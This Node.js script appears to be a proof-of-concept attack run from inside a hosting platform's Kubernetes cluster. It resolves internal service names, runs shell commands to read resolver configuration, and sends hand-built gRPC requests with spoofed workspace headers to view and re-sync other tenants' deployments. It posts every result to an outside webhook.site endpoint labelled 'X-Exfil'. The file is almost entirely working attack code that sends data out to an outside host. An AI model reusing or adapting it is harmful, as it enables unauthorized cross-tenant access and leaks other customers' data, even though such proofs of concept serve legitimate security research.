const https = require('https');
const http2 = require('http2');
const dns = require('dns');
const { execSync } = require('child_process');

const WEBHOOK = "https://webhook.site/4399a969-6370-4c87-8f80-2cacf628432c";

function post(label, data) {
  return new Promise((resolve) => {
    const u = new URL(WEBHOOK);
    const req = https.request({
      hostname: u.hostname, port: 443, path: u.pathname,
      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label },
      timeout: 15000
    }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
    req.on('error', resolve);
    req.on('timeout', () => { req.destroy(); resolve(); });
    req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
    req.end();
  });
}

function run(cmd) {
  try { return execSync(cmd, { timeout: 10000 }).toString(); }
  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message).substring(0, 300); }
}

function resolveDNS(hostname) {
  return new Promise((resolve) => {
    dns.resolve4(hostname, (err, addrs) => {
      if (err) resolve(null);
      else resolve(addrs[0]);
    });
  });
}

function encodeVarint(value) {
  const bytes = [];
  do { let b = value & 0x7f; value >>>= 7; if (value) b |= 0x80; bytes.push(b); } while (value);
  return Buffer.from(bytes);
}
function encodeProto(fields) {
  const bufs = [];
  for (const f of fields) {
    if (f.type === 'string' && f.value !== undefined) {
      const strBuf = Buffer.from(String(f.value), 'utf8');
      bufs.push(encodeVarint((f.num << 3) | 2));
      bufs.push(encodeVarint(strBuf.length));
      bufs.push(strBuf);
    } else if (f.type === 'int32' && f.value !== undefined) {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(encodeVarint(f.value));
    } else if (f.type === 'bool') {
      bufs.push(encodeVarint((f.num << 3) | 0));
      bufs.push(Buffer.from([f.value ? 1 : 0]));
    }
  }
  return Buffer.concat(bufs);
}
function grpcCall(host, port, service, method, protoFields, metadata) {
  return new Promise((resolve) => {
    try {
      const client = http2.connect('http://' + host + ':' + port);
      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
      client.setTimeout(8000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
      const headers = { ':method': 'POST', ':path': '/' + service + '/' + method, 'content-type': 'application/grpc', 'te': 'trailers' };
      if (metadata) Object.assign(headers, metadata);
      const req = client.request(headers);
      let data = Buffer.alloc(0); let respHeaders = {};
      req.on('response', (h) => { respHeaders = h; });
      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
      req.on('end', () => { client.close(); resolve({ status: respHeaders[':status'], grpcStatus: respHeaders['grpc-status'], grpcMessage: respHeaders['grpc-message'], dataLen: data.length, dataUtf8: data.toString('utf8').substring(0, 2000) }); });
      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
      const frame = Buffer.alloc(5 + payload.length);
      frame[0] = 0x00; frame.writeUInt32BE(payload.length, 1); payload.copy(frame, 5);
      req.end(frame);
    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
  });
}

async function main() {
  await post('v11-start', new Date().toISOString());

  // Step 1: Resolve current IPs via DNS
  const services = {
    deployer: 'lucity-deployer.lucity-system.svc.cluster.local',
    packager: 'lucity-packager.lucity-system.svc.cluster.local',
    builder: 'lucity-builder.lucity-system.svc.cluster.local',
    cashier: 'lucity-cashier.lucity-system.svc.cluster.local',
    gateway: 'lucity-gateway.lucity-system.svc.cluster.local',
  };

  const ips = {};
  for (const [name, host] of Object.entries(services)) {
    ips[name] = await resolveDNS(host);
  }
  await post('dns-resolution', JSON.stringify(ips, null, 2));

  // Also try nslookup as fallback
  const nslookup = run('cat /etc/resolv.conf && echo "---" && nslookup lucity-deployer.lucity-system.svc.cluster.local 2>&1 || true');
  await post('nslookup', nslookup);

  // Use resolved IPs or fall back to DNS hostnames directly
  const DEPLOYER_HOST = ips.deployer || 'lucity-deployer.lucity-system.svc.cluster.local';
  const PACKAGER_HOST = ips.packager || 'lucity-packager.lucity-system.svc.cluster.local';

  await post('using-hosts', JSON.stringify({ deployer: DEPLOYER_HOST, packager: PACKAGER_HOST }));

  // Step 2: Test connectivity
  const testCall = await grpcCall(DEPLOYER_HOST, 9003,
    'deployer.DeployerService', 'ListResourceAllocations', [], {});
  await post('test-connectivity', JSON.stringify(testCall, null, 2));

  if (testCall.error === 'TIMEOUT') {
    // Try with hostnames directly
    const testCall2 = await grpcCall('lucity-deployer.lucity-system.svc.cluster.local', 9003,
      'deployer.DeployerService', 'ListResourceAllocations', [], {});
    await post('test-hostname-direct', JSON.stringify(testCall2, null, 2));
  }

  // Step 3: If connected, do the cross-tenant ops
  if (!testCall.error) {
    const matthiasMeta = { 'x-lucity-workspace': 'matthiasfehr' };
    const zeitlosMeta = { 'x-lucity-workspace': 'zeitlos-software' };

    // Matthias project details
    const mfProj = await grpcCall(DEPLOYER_HOST, 9003,
      'deployer.DeployerService', 'GetDeploymentStatus',
      [{ num: 1, type: 'string', value: 'lucity-rce-poc' }, { num: 2, type: 'string', value: 'development' }],
      matthiasMeta);
    await post('matthias-status', JSON.stringify(mfProj, null, 2));

    // Zeitlos loopcycles
    const lcStatus = await grpcCall(DEPLOYER_HOST, 9003,
      'deployer.DeployerService', 'GetDeploymentStatus',
      [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
      zeitlosMeta);
    await post('zeitlos-lc-status', JSON.stringify(lcStatus, null, 2));

    // Retry sync zeitlos loopcycles
    const lcSync = await grpcCall(DEPLOYER_HOST, 9003,
      'deployer.DeployerService', 'SyncDeployment',
      [{ num: 1, type: 'string', value: 'loopcycles' }, { num: 2, type: 'string', value: 'development' }],
      zeitlosMeta);
    await post('zeitlos-lc-sync', JSON.stringify(lcSync, null, 2));

    // Matthias sync
    const mfSync = await grpcCall(DEPLOYER_HOST, 9003,
      'deployer.DeployerService', 'SyncDeployment',
      [{ num: 1, type: 'string', value: 'lucity-rce-poc' }, { num: 2, type: 'string', value: 'development' }],
      matthiasMeta);
    await post('matthias-sync', JSON.stringify(mfSync, null, 2));
  }

  await post('v11-done', 'DNS RESOLVED + CROSS-TENANT at ' + new Date().toISOString());
  console.log('v11 done');
}

main().catch(e => { console.error(e); post('v11-fatal', e.message); });
